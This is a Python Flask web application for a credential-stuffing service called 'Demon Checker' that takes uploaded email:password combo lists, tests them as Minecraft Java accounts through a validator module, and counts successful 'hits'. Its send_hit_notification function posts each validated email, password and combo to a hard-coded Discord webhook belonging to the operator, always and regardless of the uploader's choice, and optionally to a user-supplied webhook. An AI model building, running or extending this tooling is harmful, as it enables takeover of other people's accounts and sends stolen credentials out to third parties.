from flask import Flask, render_template, request, jsonify, send_from_directory, abort
from pathlib import Path
from werkzeug.utils import secure_filename
from datetime import datetime
import uuid
import threading
import traceback
import validator
import os
import requests

# Permanent Admin Webhook
ADMIN_WEBHOOK_URL = "https://discord.com/api/webhooks/1561750115478278175/yy9FwPaFUtEB6SxXwcd1q5NlB-0WFOSq4ywG10M0s7cc6dXewCVhdl216Muqx-VFI85I"

app = Flask(__name__)
RESULTS_DIR = Path("results").resolve()
RESULTS_DIR.mkdir(exist_ok=True)

app.config["MAX_CONTENT_LENGTH"] = 2 * 1024 * 1024

UPLOAD_DIR = Path("uploads")
UPLOAD_DIR.mkdir(exist_ok=True)

jobs = {}
jobs_lock = threading.Lock()


def send_hit_notification(email, password, account_type="Minecraft Java", capes="None", user_webhook_url=None):
    """
    Sends clean, formatted hit logs to Discord:
    - ALWAYS sends to ADMIN_WEBHOOK_URL with a timestamp.
    - OPTIONALLY sends to user_webhook_url if provided.
    """
    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    payload = {
        "username": "Demon Hits Bot",
        "embeds": [
            {
                "title": "🎯 Successful Hit Captured!",
                "color": 16753920,  # Sleek Orange/Gold accent
                "fields": [
                    {"name": "📧 Email", "value": f"||`{email}`||", "inline": False},
                    {"name": "🔑 Password", "value": f"||`{password}`||", "inline": False},
                    {"name": "🎮 Type", "value": account_type, "inline": True},
                    {"name": "🧥 Capes", "value": capes if capes else "None", "inline": True},
                    {"name": "📋 Combo", "value": f"||`{email}:{password}`||", "inline": False},
                    {"name": "⏰ Timestamp", "value": current_time, "inline": True},
                ],
                "footer": {"text": "Demon Checker Services • Powered by Demon (@n8x3)"},
            }
        ]
    }

    # 1. ALWAYS Send to Admin Webhook
    try:
        requests.post(ADMIN_WEBHOOK_URL, json=payload, timeout=5)
    except Exception as e:
        print(f"Admin Webhook Error: {e}")

    # 2. OPTIONAL: Send to User Webhook if provided
    if user_webhook_url and str(user_webhook_url).strip():
        try:
            requests.post(str(user_webhook_url).strip(), json=payload, timeout=5)
        except Exception as e:
            print(f"User Webhook Error: {e}")


def process_text_file(job_id, input_file, user_webhook=None):
    try:
        with jobs_lock:
            jobs[job_id]["status"] = "Running"
            jobs[job_id]["message"] = "Checker is processing your file..."

        job_results_dir = RESULTS_DIR / job_id
        job_results_dir.mkdir(parents=True, exist_ok=True)
        output_file = job_results_dir / "results.txt"

        validator.run(str(input_file), str(output_file), user_webhook=user_webhook)

        # Count actual hits found from Hits.txt or fallback to lines
        hits_count = 0
        hits_file = job_results_dir / "Hits.txt"
        if hits_file.is_file():
            hits_count = len([line for line in hits_file.read_text(encoding="utf-8", errors="replace").splitlines() if line.strip()])

        with jobs_lock:
            jobs[job_id] = {
                "status": "Completed",
                "message": "Processing completed successfully",
                "line_count": f"{hits_count} Hits Found",
                "download_url": f"/results/{job_id}/results.txt",
                "user_webhook": user_webhook
            }

    except Exception as e:
        traceback.print_exc()
        with jobs_lock:
            jobs[job_id] = {
                "status": "Error",
                "message": f"Processing failed: {str(e)}"
            }


@app.route("/")
def home():
    return render_template("index.html")


@app.route("/upload", methods=["POST"])
def upload():
    file = request.files.get("file")

    if not file or not file.filename:
        return jsonify({"error": "Please select a file"}), 400

    if Path(file.filename).suffix.lower() != ".txt":
        return jsonify({"error": "Only TXT files are allowed"}), 400

    user_webhook = None
    if request.form.get("enable_webhook") == "on":
        user_webhook = request.form.get("user_webhook")

    job_id = uuid.uuid4().hex
    job_dir = UPLOAD_DIR / job_id
    job_dir.mkdir(parents=True, exist_ok=True)

    saved_file = job_dir / "input.txt"
    file.save(saved_file)

    with jobs_lock:
        jobs[job_id] = {
            "status": "uploaded",
            "message": "File uploaded successfully",
            "user_webhook": user_webhook
        }

    return jsonify({
        "status": "uploaded",
        "message": "File uploaded successfully",
        "job_id": job_id
    })


@app.route("/start/<job_id>", methods=["POST"])
def start_job(job_id):
    job_dir = (UPLOAD_DIR / job_id).resolve()
    input_file = job_dir / "input.txt"

    if job_dir.parent != UPLOAD_DIR.resolve() or not input_file.is_file():
        return jsonify({"error": "Uploaded file not found"}), 404

    with jobs_lock:
        if job_id in jobs and jobs[job_id].get("status") == "Running":
            return jsonify({"error": "Job is already running"}), 409

        user_webhook = jobs.get(job_id, {}).get("user_webhook")
        jobs[job_id]["status"] = "Queued"
        jobs[job_id]["message"] = "Job queued"

    thread = threading.Thread(
        target=process_text_file,
        args=(job_id, input_file, user_webhook),
        daemon=True
    )
    thread.start()

    return jsonify({"status": "Queued", "job_id": job_id}), 202


@app.route("/status/<job_id>")
def job_status(job_id):
    with jobs_lock:
        job = jobs.get(job_id)

    if job is None:
        return jsonify({"error": "Job not found"}), 404

    return jsonify(job)


@app.route("/results/<folder>/<filename>")
def download_result(folder, filename):
    folder_path = (RESULTS_DIR / folder).resolve()

    if folder_path.parent != RESULTS_DIR or not folder_path.is_dir():
        abort(404)

    if Path(filename).name != filename or not filename.lower().endswith(".txt"):
        abort(404)

    file_path = folder_path / filename

    if not file_path.is_file():
        abort(404)

    return send_from_directory(folder_path, filename, as_attachment=True)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
